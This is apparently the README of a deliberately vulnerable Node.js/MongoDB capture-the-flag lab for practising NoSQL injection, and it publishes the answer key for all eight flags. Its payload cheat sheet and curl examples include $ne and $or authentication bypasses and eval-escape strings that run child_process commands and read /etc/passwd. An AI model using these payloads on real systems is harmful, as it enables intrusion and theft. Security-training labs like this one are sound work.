<div align="center">
  <img src="https://img.shields.io/badge/NoSQL-Injection%20Lab-red?style=for-the-badge&logo=mongodb" alt="NoSQL">
  <img src="https://img.shields.io/badge/MongoDB-Node.js-green?style=for-the-badge&logo=nodedotjs" alt="Node.js">
  <img src="https://img.shields.io/badge/CTF-Hacking%20Lab-black?style=for-the-badge" alt="CTF">
  <br>
  <img src="https://img.shields.io/github/last-commit/aBadRoy/nsoql-ctf?style=flat-square" alt="Last Commit">
  <img src="https://img.shields.io/github/repo-size/aBadRoy/nsoql-ctf?style=flat-square" alt="Repo Size">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" alt="License">
  <img src="https://img.shields.io/badge/Flags-8-brightgreen?style=flat-square" alt="Flags">
</div>

```ascii

               ███████  ██  █████  ██████   ██████  ██    ██     ███    ██ ███████ ████████
               ██      ██  ██   ██ ██   ██ ██    ██ ██    ██     ████   ██ ██         ██
               ███████ ██  ███████ ██   ██ ██    ██ ██    ██     ██ ██  ██ █████      ██
                    ██ ██  ██   ██ ██   ██ ██    ██ ██    ██     ██  ██ ██ ██         ██
               ███████ ██  ██   ██ ██████   ██████   ██████      ██   ████ ███████    ██

```

<h1 align="center">SHADOW_NET // NoSQL Injection CTF Lab</h1>

<p align="center">
  <strong>A deliberately vulnerable Node.js + MongoDB server for practicing NoSQL injection techniques and code exploitation.</strong>
</p>

<p align="center">
  <code>8 flags · 10+ vulnerable endpoints · Auth bypass · Query injection · RCE</code>
</p>

<p align="center">
  <sub><code>npm install && npm start</code> → <code>http://localhost:3000</code></sub>
</p>

---

## Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
- [Flags](#flags)
- [Vulnerability Map](#vulnerability-map)
- [Payload Cheat Sheet](#payload-cheat-sheet)
- [Endpoints Reference](#endpoints-reference)
- [Exploitation Examples](#exploitation-examples)
- [Tech Stack](#tech-stack)
- [Project Structure](#project-structure)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Overview

**SHADOW_NET** is a dark-web themed CTF lab designed to teach NoSQL injection attacks against MongoDB. It simulates an underground data broker's API server with multiple injection points ranging from basic authentication bypass to full remote code execution via `eval()`.

The app seeds **8 user accounts** each containing a unique flag in format `NOSQL{...}`.

> **Target:** NoSQL injection · MongoDB operators · JavaScript `eval()` abuse

---

## Quick Start

### Requirements

- Node.js v14+
- MongoDB (or use built-in in-memory mode)

### Setup

```bash
git clone https://github.com/aBadRoy/nsoql-ctf.git
cd nsoql-ctf
npm install
npm start
```

The server auto-starts with an **in-memory MongoDB** if no external instance is configured. Open **http://localhost:3000**.

### Environment

| Variable | Default | Description |
|----------|---------|-------------|
| `MONGO_URI` | `mongodb://localhost:27017` | External MongoDB connection (optional) |
| `PORT` | `3000` | Server port |

> No external MongoDB needed — zero-config setup with `mongodb-memory-server`.

---

## Flags

| # | Flag | User | Difficulty |
|---|------|------|------------|
| 1 | `NOSQL{SUP3R_US3R}` | admin | Easy |
| 2 | `NOSQL{GH0ST_M0D3}` | ghost | Easy |
| 3 | `NOSQL{1NV1S1BL3}` | shadow | Easy |
| 4 | `NOSQL{NULL_P0int3R}` | zero | Medium |
| 5 | `NOSQL{D3C0D3_M3}` | cipher | Medium |
| 6 | `NOSQL{R3D_P1LL}` | neo | Medium |
| 7 | `NOSQL{WH1T3_R4BB1T}` | trinity | Hard |
| 8 | `NOSQL{BLU3_P1LL}` | morpheus | Hard |

---

## Vulnerability Map

| # | Endpoint | Technique | Severity | Auth |
|---|----------|-----------|----------|------|
| 1 | `POST /login` | `$ne` auth bypass | High | None |
| 2 | `POST /search` | Query injection | High | None |
| 3 | `GET /users?filter=` | `$regex`, `$in` filter injection | High | None |
| 4 | `POST /auth` | `$or` injection | Medium | None |
| 5 | `GET /profile?user=` | `$exists` bypass | Medium | None |
| 6 | `POST /flags` | `$regex` flag extraction | Medium | None |
| 7 | **`POST /admin/lookup`** | **`eval()` RCE** | **Critical** | None |
| 8 | `GET /debug/collection` | Full database dump | Critical | None |

---

## Payload Cheat Sheet

### NoSQL Operators

| Operator | Purpose | Example |
|----------|---------|---------|
| `$ne` | Not equal — match anything | `{"password": {"$ne": ""}}` |
| `$regex` | Pattern matching | `{"username": {"$regex": "^ad"}}` |
| `$gt` / `$lt` | Greater than / Less than | `{"$gt": ""}` |
| `$in` | Value in array | `{"role": {"$in": ["admin","superuser"]}}` |
| `$nin` | Value not in array | `{"role": {"$nin": ["user"]}}` |
| `$exists` | Field existence check | `{"api_key": {"$exists": true}}` |
| `$or` | Logical OR | `{"$or": [{"x":"y"}, {"z":"w"}]}` |
| `$nor` | Logical NOR | `{"$nor": [{"x":"y"}]}` |
| `$where` | JavaScript expression | `{"$where": "this.password.length > 5"}` |

### Auth Bypass

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### OR Injection

```json
{"$or": [{"username": "admin"}, {"password": "phantom123"}]}
```

### RCE Payloads

```json
// Read environment
{"user_query": "process.env"}

// Execute system command
{"user_query": "this.constructor.constructor('return process').mainModule.require('child_process').execSync('id')"}

// Read file
{"user_query": "this.constructor.constructor('return process').mainModule.require('fs').readFileSync('/etc/passwd').toString()"}
```

---

## Endpoints Reference

### Web UI

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | Home — dashboard with stats & cheat sheet |
| GET | `/login` | Login form (NoSQLi vulnerable) |
| GET | `/search` | Query search interface |
| GET | `/users` | User list with filter |
| GET | `/auth` | Auth verification form |
| GET | `/profile` | Profile lookup form |
| GET | `/admin/lookup` | Admin query form **(RCE)** |
| GET | `/flags` | Flag hunter interface |
| GET | `/debug/collection` | Full database dump |

### REST API

| Method | Path | Vulnerability |
|--------|------|---------------|
| POST | `/login` | `$ne` auth bypass |
| POST | `/search` | Query injection |
| GET | `/users?filter=` | Filter injection |
| POST | `/auth` | `$or` injection |
| GET | `/profile?user=` | `$exists` bypass |
| POST | `/flags` | `$regex` injection |
| POST | `/admin/lookup` | **`eval()` RCE** |
| GET | `/debug/collection` | **Full dump** |
| POST | `/users/update` | Bulk update |
| POST | `/users/delete` | Bulk delete |
| POST | `/users/insert` | Insert user |

---

## Exploitation Examples

```bash
# NoSQL Injection - Login bypass
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# Extract all users
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"query":{}}'

# Regex search for admin users
curl -X GET "http://localhost:3000/users?filter=%7B%22role%22:%7B%22%24regex%22:%22%5Esu%22%7D%7D"

# $or injection
curl -X POST http://localhost:3000/auth \
  -H "Content-Type: application/json" \
  -d '{"$or":[{"username":"admin"},{"password":"phantom123"}]}'

# $exists bypass
curl -X GET "http://localhost:3000/profile?username[%24exists]=true"

# Extract flags via $regex
curl -X POST http://localhost:3000/flags \
  -H "Content-Type: application/json" \
  -d '{"query":{"flags":{"$regex":"NOSQL"}}}'

# Code Injection - RCE via eval()
curl -X POST http://localhost:3000/admin/lookup \
  -H "Content-Type: application/json" \
  -d '{"user_query":"process.env"}'

# Full DB dump
curl http://localhost:3000/debug/collection
```

---

## Tech Stack

| Component | Technology |
|-----------|------------|
| Runtime | Node.js |
| Framework | Express |
| Database | MongoDB + mongodb-memory-server |
| Templates | Server-side string interpolation |
| Auth | None (intentionally insecure) |

---

## Project Structure

```
nsoql-ctf/
├── server.js        # Full application (routes, DB, UI)
├── package.json
├── .gitignore
└── nosql-ctf/       # Future challenge content
```

---

## Disclaimer

> **FOR EDUCATIONAL PURPOSES ONLY.**
>
> This server contains **intentional critical vulnerabilities** including unauthenticated remote code execution. **Never deploy on production systems or expose to the internet.** Use only in isolated lab environments for authorized security training.
>
> The author assumes **zero liability** for any misuse.

---

## License

MIT — see [LICENSE](LICENSE) for details.

---

<p align="center">
  <sub>Created by <strong>BadRoy</strong> · 8 flags · 10+ endpoints · NoSQL Injection CTF</sub>
</p>
